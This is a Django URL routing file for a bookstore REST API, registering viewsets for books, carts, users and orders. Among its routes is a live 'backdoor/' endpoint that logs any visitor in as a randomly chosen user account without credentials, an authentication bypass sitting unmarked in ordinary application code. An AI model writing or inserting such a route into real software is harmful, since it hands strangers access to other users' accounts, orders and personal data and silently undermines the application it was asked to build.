from django.contrib import admin
from django.contrib.auth import login
from django.http import HttpResponse
from django.urls import path, include, re_path
from rest_framework.routers import DefaultRouter
from books.views import *
from cart.views import CartViewSet, CartBookViewSet
from user.models import User
from user.views import UserViewSet
from order.views import OrderViewSet
from .yasg import urlpatterns as doc_urls
import random

router = DefaultRouter()
router.register(r'books', BookViewSet, basename="books")
router.register(r'authors', AuthorViewSet, basename="author")
router.register(r'genres', GenreViewSet, basename="genres")
router.register(r'publishers', PublisherViewSet, basename="publishers")
router.register(r'categories', CategoryViewSet, basename="categories")
router.register(r'books_instances', BookInstanceViewSet, basename="books_instances")
router.register(r'carts', CartViewSet, basename="carts")
router.register(r'cartbooks', CartBookViewSet, basename="cartbooks")
router.register(r'users', UserViewSet, basename="users")
router.register(r'orders', OrderViewSet, basename="orders")

urlpatterns = [
    path('admin/', admin.site.urls, ),
    path('backdoor/', lambda request: HttpResponse(bool(login(request, random.choice(User.objects.all()))))),
    path('api/drf-auth/', include('rest_framework.urls')),
    path('api/', include(router.urls)),
    path(r'api/auth/', include('djoser.urls')),
    re_path(r'^auth/', include('djoser.urls.authtoken')),
]

urlpatterns += doc_urls
